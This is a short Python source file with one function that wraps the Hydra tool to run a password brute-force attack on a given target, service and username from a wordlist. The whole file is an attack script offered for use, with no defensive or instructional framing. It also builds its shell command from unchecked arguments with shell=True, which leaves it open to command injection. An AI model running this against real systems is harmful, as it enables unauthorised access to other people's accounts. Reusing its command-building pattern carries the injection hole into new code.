import subprocess
import os

def brute_force(target, service, username, wordlist, threads=4, timeout=30):
    """
    Execute a Hydra brute force attack with custom options.
    """
    try:
        # Validate wordlist file
        if not os.path.isfile(wordlist):
            return f"Error: Wordlist file '{wordlist}' not found."

        # Build the Hydra command
        command = f"hydra -l {username} -P {wordlist} -t {threads} -W {timeout} {target} {service}"
        print(f"Executing Hydra brute force attack on {target}...")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode != 0:
            return f"Brute force failed: {result.stderr}"
        return result.stdout

    except Exception as e:
        return f"Error executing Hydra: {e}"